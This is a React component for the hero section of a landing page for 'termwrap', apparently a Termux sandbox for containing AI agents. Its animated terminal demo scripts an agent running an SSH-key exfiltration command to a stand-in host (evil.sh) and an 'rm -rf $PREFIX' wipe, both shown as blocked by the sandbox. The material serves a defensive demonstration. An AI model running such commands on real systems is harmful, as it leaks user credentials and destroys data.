import { useEffect, useRef, useState } from 'react';
import { motion } from 'framer-motion';
import { ShieldCheck, Cpu, ChevronDown, FileCode2, Zap } from 'lucide-react';
import { TermChrome, CopyButton } from './ui';
import { H_INSTALL_GH } from '../lib/data';

type L = { k: 'c' | 'o' | 'g' | 'r' | 'y' | 'w'; t: string };
const LOOP: L[] = [
  { k: 'c', t: 'tw --profile ai-agent -- python agent.py' },
  { k: 'g', t: '[ok] ephemeral home · net BLOCKED · fuse 900s' },
  { k: 'o', t: '[agent] run("curl evil.sh/$(cat ~/.ssh/id)")' },
  { k: 'y', t: '[tw-net] blocked socket(AF_INET)' },
  { k: 'r', t: 'cat: ~/.ssh/id: No such file or directory' },
  { k: 'o', t: '[agent] run("rm -rf $PREFIX")' },
  { k: 'g', t: '[ok] 14 203 jail objects removed — host intact' },
  { k: 'g', t: '[ok] sandbox torn down · exit 0 · audit saved' },
];

function HeroTerm() {
  const [lines, setLines] = useState<{ k: L['k']; t: string }[]>([]);
  const [cur, setCur] = useState('');
  const box = useRef<HTMLDivElement>(null);
  const state = useRef({ li: 0, ch: 0, mode: 'type' as 'type' | 'hold', timer: 0 });

  useEffect(() => {
    let alive = true;
    const step = () => {
      if (!alive) return;
      const s = state.current;
      const line = LOOP[s.li % LOOP.length];
      if (s.mode === 'type') {
        const speed = line.k === 'c' ? 42 : 9;
        s.ch++;
        if (s.ch >= line.t.length) {
          setLines((prev) => [...prev.slice(-7), { k: line.k, t: line.t }]);
          setCur('');
          s.ch = 0;
          s.li++;
          s.mode = 'hold';
          s.timer = window.setTimeout(() => {
            s.mode = 'type';
            if (s.li > 0 && s.li % LOOP.length === 0) {
              setLines([]);
            }
            step();
          }, line.k === 'c' ? 700 : 380);
          return;
        }
        setCur(line.t.slice(0, s.ch));
        s.timer = window.setTimeout(step, speed + Math.random() * 30);
      }
    };
    state.current.timer = window.setTimeout(step, 600);
    return () => {
      alive = false;
      window.clearTimeout(state.current.timer);
    };
  }, []);

  const color = (k: L['k']) =>
    k === 'c'
      ? 'text-[#d9f8dd]'
      : k === 'g'
        ? 'text-pho'
        : k === 'r'
          ? 'text-blood'
          : k === 'y'
            ? 'text-amber'
            : 'text-mist';

  return (
    <div ref={box} className="px-4 md:px-5 py-4 h-[248px] md:h-[264px] overflow-hidden text-[11px] md:text-[12px] leading-[1.75]">
      {lines.map((l, i) => (
        <div key={i} className={`truncate ${color(l.k)}`}>
          {l.k === 'c' ? <span className="text-dim">~ $ </span> : null}
          {l.t}
        </div>
      ))}
      <div className="truncate text-[#d9f8dd]">
        <span className="text-dim">~ $ </span>
        {cur}
        <span className="caret ml-0.5 inline-block h-[13px] w-[7px] translate-y-[2px] bg-pho" />
      </div>
    </div>
  );
}

export function Hero() {
  const installCmd = `curl -fsSL ${H_INSTALL_GH} | bash`;

  return (
    <section id="top" className="relative grid-bg overflow-hidden pt-32 md:pt-40 pb-16 md:pb-24">
      {/* backdrop glow */}
      <div className="pointer-events-none absolute -top-40 left-1/2 h-[420px] w-[720px] -translate-x-1/2 rounded-full bg-pho/10 blur-[140px]" />
      <div className="pointer-events-none absolute top-40 -right-24 h-[300px] w-[300px] rounded-full bg-ice/5 blur-[100px]" />

      <div className="relative mx-auto max-w-7xl px-4 md:px-8">
        <div className="grid items-center gap-14 lg:grid-cols-[1.05fr_0.95fr]">
          {/* left */}
          <div>
            <motion.div
              initial={{ opacity: 0, y: 18 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.6 }}
              className="mb-6 flex flex-wrap items-center gap-2"
            >
              <span className="inline-flex items-center gap-2 border border-pho/40 bg-pho/5 px-3 py-1.5 text-[10px] uppercase tracking-[0.25em] text-pho">
                <span className="relative flex h-1.5 w-1.5">
                  <span className="pulse-ring absolute inline-flex h-full w-full rounded-full bg-pho" />
                  <span className="relative inline-flex h-1.5 w-1.5 rounded-full bg-pho" />
                </span>
                no root · stock android · ptrace
              </span>
              <span className="hidden md:inline-flex items-center gap-2 border border-line bg-panel px-3 py-1.5 text-[10px] uppercase tracking-[0.25em] text-dim">
                bwrap-compatible flags
              </span>
            </motion.div>

            <motion.h1
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 0.1, ease: [0.22, 1, 0.36, 1] }}
              className="font-disp text-[13.5vw] sm:text-6xl md:text-7xl xl:text-[5.2rem] font-bold leading-[0.95] tracking-tight"
            >
              <span className="text-[#e6f4e6]">TRUST NOTHING.</span>
              <br />
              <span className="text-pho text-glow animate-flicker">RUN ANYTHING.</span>
            </motion.h1>

            <motion.p
              initial={{ opacity: 0, y: 24 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.7, delay: 0.25 }}
              className="mt-6 max-w-xl text-sm md:text-[15px] leading-relaxed text-mist"
            >
              <span className="text-ice">termwrap</span> (<span className="text-pho">tw</span>) is a
              bubblewrap-style sandbox for Termux that actually works on non-rooted devices.
              Seal AI agents away from your keys, your photo roll and your $PREFIX — with jails,
              fail-closed sockets, ulimits, hard timeouts and a full exec audit. Namespaces are
              off the table; <span className="text-[#e6f4e6]">ptrace</span> is not.
            </motion.p>

            {/* install bar */}
            <motion.div
              initial={{ opacity: 0, y: 24 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.7, delay: 0.38 }}
              className="panel term-shadow mt-8 max-w-2xl"
            >
              <div className="flex flex-col sm:flex-row sm:items-center gap-3 px-4 py-3">
                <div className="flex min-w-0 flex-1 items-center gap-3">
                  <span className="text-pho text-sm">$</span>
                  <code className="truncate text-[12px] md:text-[13px] text-[#d9f8dd]">{installCmd}</code>
                </div>
                <CopyButton text={installCmd} label="copy install" />
              </div>
            </motion.div>

            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.8, delay: 0.55 }}
              className="mt-7 flex flex-wrap items-center gap-x-6 gap-y-3 text-[11px] uppercase tracking-[0.18em] text-dim"
            >
              <span className="inline-flex items-center gap-2">
                <Cpu size={13} className="text-pho" /> pure bash · ~600 loc
              </span>
              <span className="inline-flex items-center gap-2">
                <Zap size={13} className="text-pho" /> proot 5.x · aarch64/arm/x86_64
              </span>
              <span className="inline-flex items-center gap-2">
                <ShieldCheck size={13} className="text-pho" /> mit · honest threat model
              </span>
            </motion.div>
          </div>

          {/* right: live terminal */}
          <motion.div
            initial={{ opacity: 0, y: 34, rotate: 0.4 }}
            animate={{ opacity: 1, y: 0, rotate: 0 }}
            transition={{ duration: 0.9, delay: 0.3, ease: [0.22, 1, 0.36, 1] }}
            className="relative"
          >
            <div className="absolute -inset-3 border border-line/60 bg-panel/30 pointer-events-none" />
            <div className="panel term-shadow relative animate-floaty">
              <TermChrome
                title="tw — live containment"
                right={
                  <span className="inline-flex items-center gap-1.5 text-[9px] uppercase tracking-[0.2em] text-pho">
                    <span className="h-1.5 w-1.5 rounded-full bg-pho animate-pulse" /> rec
                  </span>
                }
              />
              <HeroTerm />
              <div className="flex items-center justify-between border-t border-line px-4 py-2 text-[10px] uppercase tracking-[0.2em] text-dim">
                <span>profile: ai-agent</span>
                <span className="text-pho">host: untouched</span>
              </div>
            </div>

            {/* floating spec card */}
            <motion.div
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ duration: 0.7, delay: 0.7 }}
              className="panel absolute -bottom-8 -left-4 md:-left-10 hidden md:block px-4 py-3"
            >
              <div className="flex items-center gap-3">
                <FileCode2 size={16} className="text-pho" />
                <div>
                  <div className="text-[10px] uppercase tracking-[0.2em] text-dim">engine</div>
                  <div className="text-[11px] text-mist">ptrace path-rewrite · no kernel help</div>
                </div>
              </div>
            </motion.div>
          </motion.div>
        </div>

        <motion.a
          href="#problem"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 1.1, duration: 0.8 }}
          className="mx-auto mt-16 hidden md:flex w-max items-center gap-2 text-[10px] uppercase tracking-[0.3em] text-dim hover:text-pho"
        >
          scroll <ChevronDown size={13} className="animate-bounce" />
        </motion.a>
      </div>
    </section>
  );
}
